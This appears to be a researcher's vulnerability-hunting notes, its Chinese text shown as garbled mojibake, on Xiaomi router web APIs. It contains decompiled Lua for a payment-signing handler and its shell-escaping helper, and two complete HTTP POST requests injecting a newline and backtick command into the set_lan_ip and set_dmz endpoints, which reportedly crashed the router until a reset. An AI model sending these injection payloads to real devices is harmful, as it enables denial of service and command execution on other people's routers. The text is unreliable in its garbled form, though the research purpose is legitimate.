emmï¼Œè¿˜æ˜¯åº”è¯¥å…ˆæ‰¾Binaryçš„å‘½ä»¤æ³¨å…¥ï¼Œå†å¾€luaåæ¨ï¼Œç›´æ¥ä»luaæ‰¾å¥½å¤šéƒ½ä¸è¡Œã€‚ã€‚ã€‚



# xqsystem

## signOrder

å¯æƒœäº†ï¼Œè¿™é‡Œå¦‚æœèƒ½å¾—åˆ°sidçš„è¯ï¼Œå¤§æ¦‚ç‡æ˜¯æœ‰ä¸ªå‘½ä»¤æ³¨å…¥çš„ã€‚

ğŸ˜”ã€‚å‘ƒï¼Œä½†æœ‰ä¸ª_cmdformatï¼Œå¼•å·é€ƒé€¸ä¸äº†ã€‚ã€‚ã€‚/(ã„’oã„’)/~~

```lua
function L4()
    -- åŠ è½½å¿…è¦æ¨¡å—
    local XQFunction = require("xiaoqiang.common.XQFunction")
    local luci_util = require("luci.util")
    local uci = require("luci.model.uci").cursor()

    -- ä»è¡¨å•ä¸­è·å–å‚æ•°
    local sid = _UPVALUE0_.formvalue("sid")
    local digest = _UPVALUE0_.formvalue("digest")

    -- æ„å»ºå“åº”è¡¨
    local response = { code = 0 }

    -- æ£€æŸ¥ `sid` å’Œ `digest` æ˜¯å¦ä¸ºç©º
    if XQFunction.isStrNil(sid) or XQFunction.isStrNil(digest) then
        response.code = 1523  -- å‚æ•°æ— æ•ˆé”™è¯¯ç 
        goto finalize
    end

    -- ä» `uci` é…ç½®ä¸­è·å– key
    local key = uci:get("mipayment", sid, "key")
    if XQFunction.isStrNil(key) then
        response.code = 1636  -- æ— æ³•æ‰¾åˆ°å¯†é’¥é”™è¯¯ç 
    else
        -- æ„å»ºç­¾åå‘½ä»¤
        local cmd = string.format(
            "matool --method signOrder --params \"%s\" \"%s\"",
            XQFunction._cmdformat(key),
            XQFunction._cmdformat(digest)
        )

        -- æ‰§è¡Œå‘½ä»¤å¹¶è·å–ç­¾åç»“æœ
        local signature = luci_util.trim(luci_util.exec(cmd))
        response.signature = signature
    end

    ::finalize::

    -- å¦‚æœæœ‰é”™è¯¯ï¼Œæ·»åŠ é”™è¯¯ä¿¡æ¯
    if response.code ~= 0 then
        response.msg = _UPVALUE1_.getErrorMessage(response.code)
    end

    -- è¾“å‡º JSON æ ¼å¼çš„å“åº”
    _UPVALUE0_.write_json(response)
end

-- å°†å‡½æ•°ç»‘å®šåˆ°å˜é‡
signOrder = L4

```





_cmdformatï¼š

```lua
function L1(A0)
  local L1, L2, L3, L4
  L1 = isStrNil
  L2 = A0
  L1 = L1(L2)
  if L1 then
    L1 = ""
    return L1
  else
    L2 = A0
    L1 = A0.gsub
    L3 = "\\"
    L4 = "\\\\"
    L1 = L1(L2, L3, L4)
    L2 = L1
    L1 = L1.gsub
    L3 = "`"
    L4 = "\\`"
    L1 = L1(L2, L3, L4)
    L2 = L1
    L1 = L1.gsub
    L3 = "\""
    L4 = "\\\""
    L1 = L1(L2, L3, L4)
    L2 = L1
    L1 = L1.gsub
    L3 = "%$"
    L4 = "\\$"
    L1 = L1(L2, L3, L4)
    return L1
  end
end
_cmdformat = L1
```





# xqnetwork

## setLanIp

ä¸€çœ¼çœ‹åˆ°å¯¹macå‚æ•°æ²¡æœ‰æ ¡éªŒã€‚ã€‚ã€‚

å˜¶ï¼Œä¼ äº†ä¸ªè¿™ä¸ªPOSTï¼š

```
POST /cgi-bin/luci/;stok=04ff237766870b2bfcec60a6bd2c50e5/api/xqnetwork/set_lan_ip HTTP/1.1
Host: 192.168.31.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.31.1/cgi-bin/luci/;stok=04ff237766870b2bfcec60a6bd2c50e5/web/setting/wifi
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: __guid=86847064.2712971008854404600.1735352234182.2537; monitor_count=26; psp=admin|||2|||0
Upgrade-Insecure-Requests: 1
Priority: u=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

ip=192.168.31.2&mask=255.255.255.0;%0a`sleep%203`
```



ç„¶åç½‘å°±ä¼šæ–­æ‰ï¼Œç„¶åwebç•Œé¢ä¹Ÿç™»ä¸è¿›å»äº†ã€‚ï¼Ÿï¼Ÿï¼Ÿ

è¿™ç®—æ˜¯ä¸€ç§å¥‡å¥‡æ€ªæ€ªçš„DoSå§ã€‚ã€‚ ç”šè‡³æœ‰å¯èƒ½å‘½ä»¤æ˜¯æ‰§è¡Œäº†çš„ï¼Ÿä½†webç•Œé¢æŒ‚äº†å•Šã€‚ã€‚ã€‚é‡å¯ï¼Ÿ

å‘ƒï¼Œé‚£åº”è¯¥å…¶å®ƒå°ç±³è·¯ç”±å™¨ä¹Ÿæœ‰è¿™ä¸ªé—®é¢˜ï¼Ÿï¼Ÿï¼Ÿ



## set_dmz

è™½è¯´æ‰“çš„æ˜¯ AX1800çš„ã€‚ã€‚ã€‚

```
POST /cgi-bin/luci/;stok=94335b2e8f051dac13ad042977816b47/api/xqnetwork/set_dmz HTTP/1.1
Host: 192.168.31.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.31.1/cgi-bin/luci/web
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: __guid=86847064.2712971008854404600.1735352234182.2537; monitor_count=29; psp=admin|||2|||0
Upgrade-Insecure-Requests: 1
Priority: u=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

ip=192.168.31.2;%0a`sleep%203`
```

åˆæŒ‚äº†ï¼Ÿï¼Ÿï¼Ÿ

ç»·ã€‚ã€‚ã€‚ é‡å¯ä¹Ÿæ²¡ç”¨ã€‚ åªèƒ½resetäº†ã€‚ã€‚ã€‚

è¿™ç§èƒ½ç®—DoSï¼Ÿï¼Ÿï¼Ÿ emmmã€‚ã€‚ã€‚åæ­£å¯ä»¥äº¤ã€‚ã€‚ã€‚

ä½†ç¬¬äºŒæ¬¡æ‰“æ²¡å¤ç°æˆåŠŸï¼Ÿï¼Ÿï¼Ÿ

ä»¥åå…ˆå¤‡ä»½ä¸€ä¸ªæ•°æ®ã€‚ã€‚ã€‚æ–¹ä¾¿æ¢å¤ã€‚ã€‚ã€‚



é‚£æ„Ÿè§‰æœ‰setçš„åœ°æ–¹éƒ½å¯èƒ½æœ‰è¿™ç§å¥‡æ€ªçš„æ¼æ´ï¼Ÿï¼Ÿï¼Ÿ

